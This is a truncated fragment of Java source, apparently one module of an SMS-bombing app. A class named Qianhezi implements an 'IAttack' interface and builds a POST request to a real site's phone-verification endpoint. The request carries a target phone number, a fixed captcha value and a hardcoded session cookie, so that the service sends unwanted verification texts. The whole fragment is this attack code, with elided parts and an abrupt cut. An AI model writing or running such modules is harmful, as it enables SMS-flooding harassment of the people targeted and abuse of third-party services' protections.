 ...
 */
public class Qianhezi implements IAttack {
    @Override
    public void attack() {
        ...
        String postBody = "phone=" + Utils.getNumber(MainApplication.context) +"&imgCode=6279";

        Request request = new Request.Builder()
                .url("https://www.qianhezi.cn/Register/getPhoneCode")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "PHPSESSID=i3j4c2ch7g30k2b463pe16tp53; Hm_lvt_7b11c6c582f72e1a9aac2c84517ea521=1450269701; Hm_lpvt_7b11c6c582f72e1a9aac2c84517ea521=1450269701")
